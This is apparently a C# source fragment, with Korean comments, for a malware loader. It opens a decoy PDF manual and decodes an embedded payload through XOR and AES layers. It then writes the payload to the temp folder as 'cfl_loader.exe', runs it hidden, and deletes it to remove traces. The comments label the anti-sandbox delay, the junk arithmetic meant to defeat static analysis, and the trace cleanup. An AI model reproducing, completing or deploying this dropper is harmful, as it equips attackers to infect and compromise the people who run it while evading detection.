    static void Main()
    {
        string encKey = "762730096f199933bbbe3c38c5e68ca415fd37f366795ce5f666e16deaab01cf";
        string encIv = "4b6547251f1b72ec70e9d4932d74b2de";
        string xorKey = "X0r_1s_N0t_S3cur3!";
        string encPayload = "";

        string tempPath = Path.Combine(Path.GetTempPath(), "cfl_loader.exe");

        try
        {
            DownloadRequiredTools();

            OpenManualPdf();

            string aesHex = XorDecrypt(encPayload, xorKey);

            // [2] 안티 샌드박스: 윈도우 API 호출 및 지연 실행
            // (Environment.TickCount를 통해 지연 시간을 계산하여 Sleep 우회 방지)
            int startTick = Environment.TickCount;
            while ((Environment.TickCount - startTick) < 3000) // 3초 대기
            {
                Thread.Sleep(100);
                // 지연 중 가짜 윈도우 API 호출 동작 (메모리 할당 흉내 등)
                GC.KeepAlive(startTick * 1337);
            }

            // [3] Inline AES 복호화 (Hex -> Base64 문자열)
            string base64Data = InlineAesDecrypt(aesHex, encKey, encIv);

            // [4] Base64 디코딩 (Base64 -> EXE 바이너리)
            byte[] bytes = Convert.FromBase64String(base64Data);

            // [5] 임시 파일 쓰기 및 실행
            File.WriteAllBytes(tempPath, bytes);

            ProcessStartInfo startInfo = new ProcessStartInfo
            {
                FileName = tempPath,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            using (Process process = Process.Start(startInfo))
            {
                process.WaitForExit();
            }
        }
        catch
        {
        }
        finally
        {
            // [5] 흔적 제거
            for (int i = 0; i < 5; i++)
            {
                try { if (File.Exists(tempPath)) File.Delete(tempPath); break; }
                catch { Thread.Sleep(500); }
            }
        }
    }
    static string XorDecrypt(string xorHex, string xorKey)
    {
        byte[] inputBytes = HexToBytes(xorHex);
        byte[] keyBytes = Encoding.UTF8.GetBytes(xorKey);
        byte[] outputBytes = new byte[inputBytes.Length];

        int junk = 0x1337;
        for (int i = 0; i < inputBytes.Length; i++)
        {
            // 장난감 수학 연산 (정적 분석기 루프 패턴 파괴)
            junk = (junk * 3 + 7) & 0xFF;
            if (junk % 2 == 0) junk += 1;

            // XOR 연산
            outputBytes[i] = (byte)(inputBytes[i] ^ keyBytes[i % keyBytes.Length]);
        }

        // Hex 문자열로 재변환하여 반환
        StringBuilder sb = new StringBuilder(outputBytes.Length * 2);
        foreach (byte b in outputBytes)
            sb.Append(b.ToString("x2"));

        return sb.ToString();
    }

    // =====================================================================
    // [이하 Inline AES 복호화 수학 로직 - 이전과 동일]
    // =====================================================================
    static string InlineAesDecrypt(string cipherHex, string keyHex, string ivHex)
    {
        byte[] cipherBytes = HexToBytes(cipherHex);
        byte[] key = HexToBytes(keyHex);
        byte[] iv = HexToBytes(ivHex);

        if (key.Length != 32) throw new Exception("키 길이 오류");
        if (iv.Length != 16) throw new Exception("IV 길이 오류");

        byte[] roundKeys = ExpandKey(key);
        byte[] decrypted = new byte[cipherBytes.Length];
        byte[] prevBlock = new byte[16];
        Array.Copy(iv, prevBlock, 16);

        for (int i = 0; i < cipherBytes.Length; i += 16)
        {
            byte[] block = new byte[16];
            Array.Copy(cipherBytes, i, block, 0, 16);

            DecryptBlock(block, roundKeys);

            for (int j = 0; j < 16; j++)
                decrypted[i + j] = (byte)(block[j] ^ prevBlock[j]);

            Array.Copy(cipherBytes, i, prevBlock, 0, 16);
        }

        int padLength = decrypted[decrypted.Length - 1];
        if (padLength < 1 || padLength > 16) throw new Exception("패딩 오류");
        int actualLength = decrypted.Length - padLength;
        byte[] result = new byte[actualLength];
        Array.Copy(decrypted, result, actualLength);

        return Encoding.UTF8.GetString(result);
    }

    static byte[] HexToBytes(string hex)
    {
        if (hex.Length % 2 != 0) throw new Exception("Hex 길이 오류");
        byte[] bytes = new byte[hex.Length / 2];
        for (int i = 0; i < hex.Length; i += 2)
            bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
        return bytes;
    }

